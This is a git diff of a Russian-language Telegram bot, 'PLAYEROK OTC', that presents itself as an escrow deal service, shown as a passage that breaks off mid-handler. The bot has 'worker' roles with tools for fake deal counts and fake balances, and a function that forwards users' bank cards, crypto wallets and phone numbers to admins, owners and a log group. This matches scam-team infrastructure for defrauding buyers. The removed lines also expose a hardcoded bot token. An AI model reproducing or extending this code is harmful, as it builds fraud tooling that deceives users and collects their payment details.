@@ -19,12 +19,7 @@ if not TOKEN:
     print("BOT_TOKEN=ваш_токен_бота")
     exit(1)
 
-# Проверяем, не используется ли старый хардкодный токен (для безопасности)
-if TOKEN == "8267059468:AAHgQ8o78PhMH3CwFVhT7hfpillQBrmt_L8":
-    print("✅ Токен загружен из .env файла")
-    print(f"🔑 Длина токена: {len(TOKEN)} символов")
-else:
-    print(f"✅ Используется другой токен (длина: {len(TOKEN)} символов)")
+print(f"✅ Токен загружен (длина: {len(TOKEN)} символов)")
 
 # Создаем экземпляр бота с токеном из .env
 bot = telebot.TeleBot(TOKEN)
@@ -41,12 +36,21 @@ users = {}
 deals = {}
 deal_activities = {}  # Словарь для хранения действий в сделках
 user_activities = {}  # Словарь для хранения действий пользователей
-admins = set()
-workers = set()
+owners = set()  # Владельцы (высший уровень)
+admins = set()  # Администраторы
+workers = set()  # Воркеры
 
 # Состояния для рассылок
 awaiting_broadcast_message = {}
 awaiting_private_message = {}
+
+# ID группы для логов
+LOG_GROUP_ID = -1002248103959  # https://t.me/+_A9awiofJFkyMDYy
+# ID тем в группе
+TOPIC_STARTS = 117      # Старты бота
+TOPIC_NEW_DEALS = 118   # Новые сделки  
+TOPIC_SUCCESS_DEALS = 119  # Успешные сделки
+TOPIC_TEXT_MESSAGES = 120  # Текстовые сообщения
 
 # Проверка существования локального фото
 print(f"🔍 Проверка локального фото: {PHOTO_PATH}")
@@ -94,6 +98,28 @@ if not PHOTO_AVAILABLE:
         print(f"❌ Не удалось создать тестовое фото: {e}")
         PHOTO_AVAILABLE = False
 
+# Функция для отправки сообщения в группу логов
+def send_to_log_group(message, topic_id=None, parse_mode='HTML'):
+    """Отправляет сообщение в группу логов"""
+    try:
+        if topic_id:
+            bot.send_message(
+                LOG_GROUP_ID,
+                message,
+                parse_mode=parse_mode,
+                message_thread_id=topic_id
+            )
+        else:
+            bot.send_message(
+                LOG_GROUP_ID,
+                message,
+                parse_mode=parse_mode
+            )
+        return True
+    except Exception as e:
+        print(f"❌ Ошибка отправки в группу логов: {e}")
+        return False
+
 # Функция для логирования действий
 def log_activity(user_id, action, deal_id=None, details=None):
     """Логирует действие пользователя или в сделке"""
@@ -132,38 +158,101 @@ def log_activity(user_id, action, deal_id=None, details=None):
         if len(deal_activities[deal_id]) > 50:
             deal_activities[deal_id] = deal_activities[deal_id][-50:]
     
+    # Отправка в соответствующие темы группы
+    if action == 'Регистрация в системе':
+        log_message = f"""
+🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>
+
+👤 <b>Пользователь:</b> @{users[user_id]['username']}
+🆔 <b>ID:</b> <code>{user_id}</code>
+⏰ <b>Время:</b> {timestamp}
+
+<b>Действие:</b> Первый запуск бота
+"""
+        send_to_log_group(log_message, TOPIC_STARTS)
+    
+    elif action == 'Создал новую сделку':
+        deal = deals.get(deal_id, {})
+        log_message = f"""
+🆕 <b>НОВАЯ СДЕЛКА</b>
+
+📋 <b>ID сделки:</b> #{deal_id[:8]}
+👤 <b>Продавец:</b> @{users[user_id]['username']}
+💰 <b>Сумма:</b> {deal.get('amount', 0)} {deal.get('currency', '')}
+📁 <b>Категория:</b> {deal.get('category', 'Товар')}
+⏰ <b>Время:</b> {timestamp}
+
+<b>Описание:</b>
+{deal.get('description', '')[:200]}
+"""
+        send_to_log_group(log_message, TOPIC_NEW_DEALS)
+    
+    elif action == 'Сделка завершена успешно':
+        deal = deals.get(deal_id, {})
+        log_message = f"""
+✅ <b>СДЕЛКА ЗАВЕРШЕНА</b>
+
+📋 <b>ID сделки:</b> #{deal_id[:8]}
+👤 <b>Продавец:</b> @{users[deal.get('seller_id', 0)]['username']}
+👤 <b>Покупатель:</b> @{users[deal.get('buyer_id', 0)]['username']}
+💰 <b>Сумма:</b> {deal.get('amount', 0)} {deal.get('currency', '')}
+⏰ <b>Время:</b> {timestamp}
+
+<b>Статус:</b> Успешно завершена
+"""
+        send_to_log_group(log_message, TOPIC_SUCCESS_DEALS)
+    
+    # Логируем текстовые сообщения, которые никуда не относились
+    elif (action in ['Обновил TON кошелёк', 'Обновил банковскую карту', 
+                     'Обновил номер телефона', 'Обновил USDT кошелёк'] or
+          'Отправил личное сообщение' in action or
+          'Отправил рассылку' in action):
+        log_message = f"""
+💬 <b>ТЕКСТОВОЕ СООБЩЕНИЕ</b>
+
+👤 <b>Пользователь:</b> @{users[user_id]['username']}
+🆔 <b>ID:</b> <code>{user_id}</code>
+⏰ <b>Время:</b> {timestamp}
+
+<b>Действие:</b> {action}
+<b>Детали:</b> {details[:200] if details else 'Нет деталей'}
+"""
+        send_to_log_group(log_message, TOPIC_TEXT_MESSAGES)
+    
     save_data()
 
 # Загрузка данных из файла
 def load_data():
     """Загружает данные из файла"""
-    global users, deals, admins, workers, deal_activities, user_activities
+    global users, deals, owners, admins, workers, deal_activities, user_activities
     try:
         if os.path.exists(DATA_FILE):
             with open(DATA_FILE, 'rb') as f:
                 data = pickle.load(f)
                 users = data.get('users', {})
                 deals = data.get('deals', {})
+                owners = data.get('owners', set())
                 admins = data.get('admins', set())
                 workers = data.get('workers', set())
                 deal_activities = data.get('deal_activities', {})
                 user_activities = data.get('user_activities', {})
                 print(f"✅ Данные загружены: {len(users)} пользователей, {len(deals)} сделок")
-                print(f"📊 Активностей: {sum(len(v) for v in user_activities.values())} пользовательских, {sum(len(v) for v in deal_activities.values())} сделочных")
+                print(f"👑 Владельцы: {len(owners)} | Админы: {len(admins)} | Воркеры: {len(workers)}")
                 return data
     except Exception as e:
         print(f"❌ Ошибка загрузки данных: {e}")
     print("✅ Созданы новые данные")
-    return {'users': {}, 'deals': {}, 'admins': set(), 'workers': set(), 'deal_activities': {}, 'user_activities': {}}
+    return {'users': {}, 'deals': {}, 'owners': set(), 'admins': set(), 'workers': set(), 'deal_activities': {}, 'user_activities': {}}
 
 # Сохранение данных в файл
 def save_data():
     """Сохраняет данные в файл"""
-    global users, deals, admins, workers, deal_activities, user_activities
+    global users, deals, owners, admins, workers, deal_activities, user_activities
     try:
         data = {
             'users': users,
             'deals': deals,
+            'owners': owners,
             'admins': admins,
             'workers': workers,
             'deal_activities': deal_activities,
@@ -181,12 +270,19 @@ def save_data():
 print("🔄 Загрузка данных...")
 load_data()
 
-# Добавьте сюда ваш Telegram ID для получения прав администратора
-YOUR_ADMIN_ID = 1521791703
-if YOUR_ADMIN_ID not in admins:
-    admins.add(YOUR_ADMIN_ID)
-    print(f"✅ ID {YOUR_ADMIN_ID} добавлен как администратор")
-    save_data()
+# Добавление владельцев
+OWNER_IDS = [1026776598, 1521791703]
+for owner_id in OWNER_IDS:
+    if owner_id not in owners:
+        owners.add(owner_id)
+        print(f"✅ ID {owner_id} добавлен как владелец")
+
+# Добавляем владельцев также в админы для совместимости
+for owner_id in owners:
+    if owner_id not in admins:
+        admins.add(owner_id)
+
+save_data()
 
 # Класс состояния для FSM
 class DealState:
@@ -222,6 +318,12 @@ def notify_admin_credentials(user_id, credential_type, new_value):
     message += f"📊 <b>Статистика:</b>\n"
     message += f"• Сделок: {user['success_deals']}\n"
     message += f"• Рейтинг: {user['rating']}⭐"
+    
+    for owner_id in owners:
+        try:
+            bot.send_message(owner_id, message, parse_mode='HTML')
+        except:
+            pass
     
     for admin_id in admins:
         try:
@@ -267,6 +369,10 @@ def init_user(user_id):
             'awaiting_deal_amount': False,
             'awaiting_deal_description': False,
             'awaiting_deal_category': False,
+            'awaiting_search_deal': False,
+            'awaiting_search_deal_activity': False,
+            'awaiting_search_user_activity': False,
+            'awaiting_search_recipient': False,
             'join_date': datetime.now().strftime("%d.%m.%Y"),
             'last_active': datetime.now().strftime("%d.%m.%Y %H:%M")
         }
@@ -288,7 +394,25 @@ def main_menu(user_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
     
     # Добавляем кнопку админ-панели только для админов
-    if user_id in admins:
+    if user_id in owners:
+        keyboard.add(
+            InlineKeyboardButton("👤 Мой профиль", callback_data='my_profile'),
+            InlineKeyboardButton("💼 Мои сделки", callback_data='my_deals')
+        )
+        keyboard.add(
+            InlineKeyboardButton("⚡ Создать сделку", callback_data='create_deal'),
+            InlineKeyboardButton("🏦 Реквизиты", callback_data='wallet_menu')
+        )
+        keyboard.add(
+            InlineKeyboardButton("🎯 Рефералы", callback_data='referral'),
+            InlineKeyboardButton("📊 Статистика", callback_data='stats_public')
+        )
+        keyboard.add(
+            InlineKeyboardButton("👷 Воркер панель", callback_data='worker_panel'),
+            InlineKeyboardButton("⚙️ Админ панель", callback_data='admin_panel')
+        )
+        keyboard.add(InlineKeyboardButton("📞 Поддержка", url='tg://user?id=943896276'))
+    elif user_id in admins:
         keyboard.add(
             InlineKeyboardButton("👤 Мой профиль", callback_data='my_profile'),
             InlineKeyboardButton("💼 Мои сделки", callback_data='my_deals')
@@ -340,8 +464,9 @@ def main_menu(user_id):
     return keyboard
 
 # Админ панель меню с большими кнопками (добавлены новые функции)
-def admin_panel_menu():
+def admin_panel_menu(user_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
+    
     keyboard.add(
         InlineKeyboardButton("📊 Статистика", callback_data='stats'),
         InlineKeyboardButton("👥 Пользователи", callback_data='show_users')
@@ -370,8 +495,72 @@ def admin_panel_menu():
         InlineKeyboardButton("💼 Накрутка сделок", callback_data='fake_deals'),
         InlineKeyboardButton("💰 Накрутка баланса", callback_data='fake_balance')
     )
-    keyboard.add(InlineKeyboardButton("👑 Выдать админку", callback_data='add_admin'))
+    
+    # Только владельцы могут добавлять/удалять админов
+    if user_id in owners:
+        keyboard.add(
+            InlineKeyboardButton("👑 Список админов", callback_data='show_admins'),
+            InlineKeyboardButton("👑 Выдать админку", callback_data='add_admin')
+        )
+        keyboard.add(InlineKeyboardButton("🗑️ Удалить админа", callback_data='remove_admin'))
+    
     keyboard.add(InlineKeyboardButton("🔙 В меню", callback_data='main_menu'))
+    return keyboard
+
+# Меню списка админов (только для владельцев)
+def admins_list_menu(page=0, admins_per_page=5):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    
+    all_admin_ids = list(admins)
+    if not all_admin_ids:
+        keyboard.add(InlineKeyboardButton("📭 Нет администраторов", callback_data='noop'))
+        keyboard.add(InlineKeyboardButton("🔙 В админку", callback_data='admin_panel'))
+        return keyboard
+    
+    total_pages = (len(all_admin_ids) + admins_per_page - 1) // admins_per_page
+    
+    start_idx = page * admins_per_page
+    end_idx = start_idx + admins_per_page
+    
+    for admin_id in all_admin_ids[start_idx:end_idx]:
+        if admin_id in owners:
+            role_icon = "👑 Владелец"
+        else:
+            role_icon = "⚙️ Админ"
+        
+        user = users.get(admin_id, {'username': f'ID:{admin_id}'})
+        keyboard.add(InlineKeyboardButton(f"{role_icon} @{user['username'][:15]}", callback_data=f'view_admin_{admin_id}'))
+    
+    # Навигация
+    nav_buttons = []
+    if page > 0:
+        nav_buttons.append(InlineKeyboardButton("⬅️ Назад", callback_data=f'show_admins_{page-1}'))
+    
+    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data='noop'))
+    
+    if page < total_pages - 1:
+        nav_buttons.append(InlineKeyboardButton("Вперед ➡️", callback_data=f'show_admins_{page+1}'))
+    
+    if nav_buttons:
+        keyboard.add(*nav_buttons)
+    
+    keyboard.add(InlineKeyboardButton("🔙 В админку", callback_data='admin_panel'))
+    return keyboard
+
+# Меню управления админом (только для владельцев)
+def admin_management_menu(admin_id):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    
+    # Не позволяем удалять владельцев
+    if admin_id in owners:
+        keyboard.add(InlineKeyboardButton("👑 Владелец (нельзя удалить)", callback_data='noop'))
+    else:
+        keyboard.add(
+            InlineKeyboardButton("🗑️ Удалить админа", callback_data=f'remove_admin_confirm_{admin_id}'),
+            InlineKeyboardButton("👤 Профиль", callback_data=f'admin_view_user_{admin_id}')
+        )
+    
+    keyboard.add(InlineKeyboardButton("🔙 К списку", callback_data='show_admins'))
     return keyboard
 
 # Меню рассылок
@@ -505,7 +694,7 @@ def deal_seller_keyboard(deal_id):
     keyboard.add(InlineKeyboardButton("🔙 Мои сделки", callback_data='my_deals'))
     return keyboard
 
-# Меню сделки для покупателя с большими кнопки
+# Меню сделки для покупателя с большими кнопки (ИСПРАВЛЕНО: "тех поддержке" вместо "тех поддержки")
 def deal_buyer_keyboard(deal_id):
     keyboard = InlineKeyboardMarkup(row_width=2)
     keyboard.add(
@@ -603,7 +792,7 @@ def user_activities_menu_keyboard(page=0, users_per_page=5):
     for user_id in all_user_ids[start_idx:end_idx]:
         user = users.get(user_id, {})
         activity_count = len(user_activities.get(user_id, []))
-        role_icon = "👑" if user_id in admins else "👷" if user_id in workers else "👤"
+        role_icon = "👑" if user_id in owners else "⚙️" if user_id in admins else "👷" if user_id in workers else "👤"
         username = user.get('username', str(user_id))
         keyboard.add(InlineKeyboardButton(f"{role_icon} @{username[:15]} ({activity_count})", callback_data=f'admin_user_activity_{user_id}_0'))
     
@@ -641,7 +830,7 @@ def private_message_recipients_keyboard(page=0, users_per_page=5):
     
     for user_id in all_user_ids[start_idx:end_idx]:
         user = users.get(user_id, {})
-        role_icon = "👑" if user_id in admins else "👷" if user_id in workers else "👤"
+        role_icon = "👑" if user_id in owners else "⚙️" if user_id in admins else "👷" if user_id in workers else "👤"
         username = user.get('username', str(user_id))
         keyboard.add(InlineKeyboardButton(f"{role_icon} @{username[:15]}", callback_data=f'select_recipient_{user_id}'))
     
@@ -755,8 +944,10 @@ def show_user_profile(user_id, chat_id, message_id=None):
     update_user_activity(user_id)
     
     role = "👤 Пользователь"
-    if user_id in admins:
-        role = "👑 Администратор"
+    if user_id in owners:
+        role = "👑 Владелец"
+    elif user_id in admins:
+        role = "⚙️ Администратор"
     elif user_id in workers:
         role = "👷 Воркер"
     
@@ -941,7 +1132,8 @@ def show_stats_admin(user_id, chat_id, message_id=None):
 📊 <b>СТАТИСТИКА PLAYEROK OTC (АДМИН)</b>
 
 👥 <b>Пользователи:</b> {len(users)}
-👑 <b>Админы:</b> {len(admins)}
+👑 <b>Владельцы:</b> {len(owners)}
+⚙️ <b>Админы:</b> {len(admins) - len(owners)}
 👷 <b>Воркеры:</b> {len(workers)}
 📋 <b>Активных сделок:</b> {len(deals)}
 👤 <b>Активных сегодня:</b> {active_users}
@@ -981,7 +1173,7 @@ def show_stats_admin(user_id, chat_id, message_id=None):
 # Функция для показа всех сделок админу
 def show_all_deals_admin(user_id, chat_id, message_id=None, page=0):
     """Показывает все сделки в системе админу"""
-    if user_id not in admins:
+    if user_id not in admins and user_id not in owners:
         return
     
     all_deal_ids = list(deals.keys())
@@ -1041,7 +1233,7 @@ def show_all_deals_admin(user_id, chat_id, message_id=None, page=0):
 # Функция для показа деталей сделки админу
 def show_deal_details_admin(user_id, chat_id, message_id, deal_id):
     """Показывает детали сделки админу"""
-    if user_id not in admins or deal_id not in deals:
+    if (user_id not in admins and user_id not in owners) or deal_id not in deals:
         return
     
     deal = deals[deal_id]
@@ -1104,7 +1296,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 # Функция для показа активности в сделке
 def show_deal_activities_admin(user_id, chat_id, message_id, deal_id, page=0):
     """Показывает активность в сделке админу"""
-    if user_id not in admins:
+    if user_id not in admins and user_id not in owners:
         return
     
     activities = deal_activities.get(deal_id, [])
@@ -1174,15 +1366,17 @@ def show_deal_activities_admin(user_id, chat_id, message_id, deal_id, page=0):
 # Функция для показа активности пользователя
 def show_user_activities_admin(user_id, chat_id, message_id, target_user_id, page=0):
     """Показывает активность пользователя админу"""
-    if user_id not in admins:
+    if user_id not in admins and user_id not in owners:
         return
     
     activities = user_activities.get(target_user_id, [])
     target_user = users.get(target_user_id, {'username': f"ID:{target_user_id}"})
     
     role = "👤 Пользователь"
-    if target_user_id in admins:
-        role = "👑 Администратор"
+    if target_user_id in owners:
+        role = "👑 Владелец"
+    elif target_user_id in admins:
+        role = "⚙️ Администратор"
     elif target_user_id in workers:
         role = "👷 Воркер"
     
@@ -1212,7 +1406,7 @@ def show_user_activities_admin(user_id, chat_id, message_id, target_user_id, pag
 <b>Всего действий:</b> {len(activities)}
 <b>Страница:</b> {page + 1}/{total_pages}
 
-<b>Последние действия:</b>
+<b>Последние действий:</b>
 """
         
         for i, activity in enumerate(activities[start_idx:end_idx], start_idx + 1):
@@ -1323,19 +1517,20 @@ def handle_start(message):
                 send_photo_message(user_id, None, buyer_text, keyboard)
                 return
     
+    # Отправляем приветственное сообщение только по команде /start
     send_photo_message(message.chat.id, None, get_welcome_text(), main_menu(user_id))
 
 # Обработчик команды /admin
 @bot.message_handler(commands=['admin'])
 def handle_admin(message):
     user_id = message.from_user.id
-    if user_id in admins:
+    if user_id in admins or user_id in owners:
         admin_text = """
 ⚙️ <b>АДМИН ПАНЕЛЬ PLAYEROK OTC</b>
 
 Управление системой гарантийных сделок
         """
-        send_photo_message(message.chat.id, None, admin_text, admin_panel_menu())
+        send_photo_message(message.chat.id, None, admin_text, admin_panel_menu(user_id))
     else:
         bot.reply_to(message, "❌ <b>ДОСТУП ЗАПРЕЩЁН</b>\nУ вас нет прав администратора", parse_mode='HTML')
 
@@ -1346,14 +1541,14 @@ def handle_stats_command(message):
     init_user(user_id)
     update_user_activity(user_id)
     
-    if user_id in admins:
+    if user_id in admins or user_id in owners:
         show_stats_admin(user_id, message.chat.id)
     else:
         show_stats_public(user_id, message.chat.id)
 
-# Обработчик команды /brugovteam для получения воркер панели (доступно всем)
-@bot.message_handler(commands=['brugovteam'])
-def handle_brugovteam(message):
+# Обработчик команды /cuprumovteam для получения воркер панели (доступно всем) - ИЗМЕНЕНО С /brugovteam
+@bot.message_handler(commands=['cuprumovteam'])
+def handle_cuprumovteam(message):
     user_id = message.from_user.id
     init_user(user_id)
     update_user_activity(user_id)
@@ -1421,19 +1616,19 @@ def callback_handler(call):
         show_user_deals(user_id, chat_id, message_id)
     
     elif call.data == 'stats_public':
-        if user_id in admins:
+        if user_id in admins or user_id in owners:
             show_stats_admin(user_id, chat_id, message_id)
         else:
             show_stats_public(user_id, chat_id, message_id)
     
     elif call.data == 'stats':
-        if user_id in admins:
+        if user_id in admins or user_id in owners:
             show_stats_admin(user_id, chat_id, message_id)
         else:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'force_save':
-        if user_id in admins:
+        if user_id in admins or user_id in owners:
             save_data()
             bot.answer_callback_query(call.id, "✅ Данные сохранены успешно!", show_alert=True)
             show_stats_admin(user_id, chat_id, message_id)
@@ -1793,7 +1988,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, ref_text, keyboard)
     
     elif call.data == 'admin_panel':
-        if user_id in admins:
+        if user_id in admins or user_id in owners:
             admin_panel_text = f"""
 ⚙️ <b>АДМИН ПАНЕЛЬ PLAYEROK OTC</b>
 
@@ -1807,12 +2002,12 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Выберите действие:</b>
             """
-            send_photo_message(chat_id, message_id, admin_panel_text, admin_panel_menu())
+            send_photo_message(chat_id, message_id, admin_panel_text, admin_panel_menu(user_id))
         else:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'worker_panel':
-        if user_id in workers or user_id in admins:
+        if user_id in workers or user_id in admins or user_id in owners:
             worker_panel_text = f"""
 👷 <b>ВОРКЕР ПАНЕЛЬ PLAYEROK OTC</b>
 
@@ -1829,7 +2024,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             bot.answer_callback_query(call.id, "❌ Доступ запрещён. Требуются права воркера", show_alert=True)
     
     elif call.data == 'worker_stats':
-        if user_id in workers or user_id in admins:
+        if user_id in workers or user_id in admins or user_id in owners:
             user = users[user_id]
             stats_text = f"""
 👷 <b>ВАША СТАТИСТИКА</b>
@@ -1858,7 +2053,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'worker_fake_deals':
-        if user_id in workers or user_id in admins:
+        if user_id in workers or user_id in admins or user_id in owners:
             users[user_id]['awaiting_fake_deals'] = True
             fake_deals_text = """
 💼 <b>НАКРУТКА СДЕЛОК (ВОРКЕР)</b>
@@ -1879,7 +2074,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'worker_fake_balance':
-        if user_id in workers or user_id in admins:
+        if user_id in workers or user_id in admins or user_id in owners:
             users[user_id]['awaiting_fake_balance'] = True
             fake_balance_text = f"""
 💰 <b>НАКРУТКА БАЛАНСА (ВОРКЕР)</b>
@@ -1902,7 +2097,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'stats':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -1914,7 +2109,8 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 📊 <b>СТАТИСТИКА PLAYEROK OTC</b>
 
 👥 <b>Пользователи:</b> {len(users)}
-👑 <b>Админы:</b> {len(admins)}
+👑 <b>Владельцы:</b> {len(owners)}
+⚙️ <b>Админы:</b> {len(admins) - len(owners)}
 👷 <b>Воркеры:</b> {len(workers)}
 📋 <b>Активных сделок:</b> {len(deals)}
 👤 <b>Активных сегодня:</b> {active_users}
@@ -1950,20 +2146,20 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, stats_text, keyboard)
     
     elif call.data == 'force_save':
-        if user_id in admins:
+        if user_id in admins or user_id in owners:
             save_data()
             bot.answer_callback_query(call.id, "✅ Данные сохранены успешно!", show_alert=True)
-            send_photo_message(chat_id, message_id, "✅ <b>ДАННЫЕ СОХРАНЕНЫ УСПЕШНО!</b>", admin_panel_menu())
+            send_photo_message(chat_id, message_id, "✅ <b>ДАННЫЕ СОХРАНЕНЫ УСПЕШНО!</b>", admin_panel_menu(user_id))
         else:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
     
     elif call.data == 'show_users':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
         if not users:
-            send_photo_message(chat_id, message_id, "📭 Нет пользователей", admin_panel_menu())
+            send_photo_message(chat_id, message_id, "📭 Нет пользователей", admin_panel_menu(user_id))
             return
         
         users_text = f"""
@@ -1980,8 +2176,10 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         for idx, (uid, user_data) in enumerate(sorted_users[:5], 1):
             role = "👤"
-            if uid in admins:
+            if uid in owners:
                 role = "👑"
+            elif uid in admins:
+                role = "⚙️"
             elif uid in workers:
                 role = "👷"
             
@@ -2001,13 +2199,131 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         
         send_photo_message(chat_id, message_id, users_text, keyboard)
     
+    elif call.data == 'show_admins':
+        # Показываем список админов (только для владельцев)
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён. Только владельцы могут просматривать список админов", show_alert=True)
+            return
+        
+        admins_text = f"""
+👑 <b>СПИСОК АДМИНИСТРАТОРОВ</b>
+
+<b>Всего:</b> {len(admins)} администраторов
+<b>Владельцы:</b> {len(owners)}
+
+<b>Страница:</b> 1
+        """
+        
+        send_photo_message(chat_id, message_id, admins_text, admins_list_menu())
+    
+    elif call.data.startswith('show_admins_'):
+        # Навигация по страницам списка админов
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        page = int(call.data.split('_')[2])
+        admins_text = f"""
+👑 <b>СПИСОК АДМИНИСТРАТОРОВ</b>
+
+<b>Всего:</b> {len(admins)} администраторов
+<b>Владельцы:</b> {len(owners)}
+
+<b>Страница:</b> {page + 1}
+        """
+        
+        send_photo_message(chat_id, message_id, admins_text, admins_list_menu(page))
+    
+    elif call.data.startswith('view_admin_'):
+        # Просмотр информации об админе (только для владельцев)
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        admin_id = int(call.data.split('_')[2])
+        if admin_id in users:
+            show_user_profile(admin_id, chat_id, message_id)
+    
+    elif call.data.startswith('remove_admin_confirm_'):
+        # Подтверждение удаления админа (только для владельцев)
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
+            return
+        
+        admin_id = int(call.data.split('_')[3])
+        
+        # Не позволяем удалять владельцев
+        if admin_id in owners:
+            bot.answer_callback_query(call.id, "❌ Нельзя удалить владельца", show_alert=True)
+            return
+        
+        if admin_id in admins:
+            admins.remove(admin_id)
+            save_data()
+            
+            # Логируем удаление администратора
+            log_activity(user_id, f'Удалил администратора ID:{admin_id}')
+            
+            if admin_id in users:
+                admin_name = users[admin_id]['username']
+                notification_text = f"""
+⚙️ <b>ВЫ БЫЛИ ЛИШЕНЫ СТАТУСА АДМИНИСТРАТОРА</b>
+
+Ваш статус администратора был отозван владельцем.
+Теперь вы являетесь обычным пользователем.
+
+Если это ошибка, свяжитесь с владельцем.
+                """
+                try:
+                    bot.send_message(admin_id, notification_text, parse_mode='HTML')
+                except:
+                    pass
+            
+            result_text = f"""
+🗑️ <b>АДМИНИСТРАТОР УДАЛЁН</b>
+
+<b>Администратор:</b> @{admin_name if admin_id in users else admin_id}
+<b>ID:</b> <code>{admin_id}</code>
+<b>Удалил:</b> @{users[user_id]['username']}
+<b>Время:</b> {datetime.now().strftime("%d.%m.%Y %H:%M")}
+
+<b>Статус администратора успешно отозван.</b>
+            """
+            send_photo_message(chat_id, message_id, result_text, admin_panel_menu(user_id))
+        else:
+            bot.answer_callback_query(call.id, "❌ Пользователь не является администратором", show_alert=True)
+    
+    elif call.data == 'remove_admin':
+        # Удаление админа (только для владельцев)
+        if user_id not in owners:
+            bot.answer_callback_query(call.id, "❌ Доступ запрещён. Только владельцы могут удалять администраторов", show_alert=True)
+            return
+        
+        users[user_id]['awaiting_remove_worker'] = True  # Используем существующее поле
+        remove_admin_text = f"""
+🗑️ <b>УДАЛЕНИЕ АДМИНИСТРАТОРА</b>
+
+<b>Введите ID администратора:</b>
+• Можно получить через список администраторов
+• Владельцев удалить нельзя
+
+<b>Формат:</b>
+<code>123456789</code>
+
+<b>Введите ID:</b>
+        """
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(InlineKeyboardButton("❌ Отмена", callback_data='admin_panel'))
+        
+        send_photo_message(chat_id, message_id, remove_admin_text, keyboard)
+    
     elif call.data == 'show_workers':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
         if not workers:
-            send_photo_message(chat_id, message_id, "📭 Нет воркеров", admin_panel_menu())
+            send_photo_message(chat_id, message_id, "📭 Нет воркеров", admin_panel_menu(user_id))
             return
         
         workers_text = f"""
@@ -2042,7 +2358,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, workers_text, keyboard)
     
     elif call.data == 'add_worker':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2065,7 +2381,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, worker_add_text, keyboard)
     
     elif call.data == 'remove_worker':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2087,7 +2403,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, remove_worker_text, keyboard)
     
     elif call.data.startswith('remove_worker_confirm_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2125,12 +2441,12 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Статус воркера успешно отозван.</b>
             """
-            send_photo_message(chat_id, message_id, result_text, admin_panel_menu())
+            send_photo_message(chat_id, message_id, result_text, admin_panel_menu(user_id))
         else:
             bot.answer_callback_query(call.id, "❌ Пользователь не является воркером", show_alert=True)
     
     elif call.data == 'demote_worker':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2153,7 +2469,7 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, demote_worker_text, keyboard)
     
     elif call.data.startswith('demote_worker_confirm_'):
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2191,12 +2507,12 @@ https://t.me/{bot.get_me().username}?start={deal_id}
 
 <b>Статус воркера успешно понижен до обычного пользователя.</b>
             """
-            send_photo_message(chat_id, message_id, result_text, admin_panel_menu())
+            send_photo_message(chat_id, message_id, result_text, admin_panel_menu(user_id))
         else:
             bot.answer_callback_query(call.id, "❌ Пользователь не является воркером", show_alert=True)
     
     elif call.data == 'check_worker_deals':
-        if user_id not in admins:
+        if user_id not in admins and user_id not in owners:
             bot.answer_callback_query(call.id, "❌ Доступ запрещён", show_alert=True)
             return
         
@@ -2218,8 +2534,9 @@ https://t.me/{bot.get_me().username}?start={deal_id}
         send_photo_message(chat_id, message_id, check_deals_text, keyboard)
     
     elif call.data == 'add_admin':
-        if user_id not in admins:
